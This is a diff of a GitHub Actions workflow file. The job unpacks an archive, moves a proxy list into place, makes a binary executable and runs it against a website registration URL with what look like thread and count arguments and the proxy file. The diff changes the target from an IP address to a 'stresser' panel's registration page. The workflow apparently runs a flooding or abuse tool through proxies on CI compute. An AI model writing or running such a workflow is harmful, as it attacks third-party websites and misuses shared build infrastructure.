@@ -33,15 +33,15 @@ jobs:
           cd ideal-guide
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
-          mv proxy.txt lynd
+          
           chmod +x *
-          mv ki o   
+          mv tol o   
           
           
           
            
           
-          ./o https://95.179.246.130/register/  350 1 1 
+          ./o https://susstresser.com/panel/register.php  350 1 1 90.txt
           
 
           
